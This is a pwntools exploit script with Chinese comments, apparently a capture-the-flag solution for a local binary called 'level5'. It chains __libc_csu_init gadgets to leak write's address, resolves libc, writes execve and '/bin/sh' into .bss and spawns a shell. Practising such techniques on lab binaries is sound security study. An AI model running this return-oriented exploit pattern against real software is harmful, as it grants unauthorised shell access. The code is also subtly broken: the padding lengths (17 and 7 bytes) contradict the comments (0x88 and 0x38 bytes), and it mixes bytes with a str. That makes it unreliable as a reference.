from pwn import *
from LibcSearcher import *

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write'] 		#获取write函数的got地址
read_got = level5.got['read']				#获取read函数的got地址
main_addr = level5.symbols['main']  #获取main函数的函数地址
bss_base = level5.bss()							#获取bss段地址
csu_front_gadget = 0x00000000004005F0 
#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget
csu_behind_gadget = 0x0000000000400606
#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget

#自定义csu函数，方便每一次构造payload
def csu(fill, rbx, rbp, r12, r13, r14, r15, main):
  #fill为填充sp指针偏移造成8字节空缺
  #rbx, rbp, r12, r13, r14, r15皆为pop参数
  #main为main函数地址
    payload = b'a' * 17 			#0x80+8个字节填满栈空间至ret返回指令
    payload += p64(csu_behind_gadget) 
    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_gadget)
    payload += b'a' * 7      #0x38个字节填充平衡堆栈造成的空缺
    payload += p64(main)
    sh.send(payload)    #发送payload
    sleep(1)						#暂停等待接收

sh.recvuntil('Hello, World\n')
#write函数布局打印write函数地址并返回main函数
csu(0,0, 1, write_got, 1, write_got, 8, main_addr)

write_addr = u64(sh.recv(8))    #接收write函数地址
libc = LibcSearcher('write', write_addr)	#LibcSearcher查找libc版本
libc_base = write_addr - libc.dump('write') #计算该版本libc基地址
execve_addr = libc_base + libc.dump('execve') #查找该版本libc execve函数地址
log.success('execve_addr ' + hex(execve_addr))

sh.recvuntil('Hello, World\n')
#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址
csu(0,0, 1, read_got, 0, bss_base, 16, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
#调用bss段中的execve('/bin/sh')
csu(0,0, 1, bss_base, bss_base+8, 0, 0, main_addr)
sh.interactive()
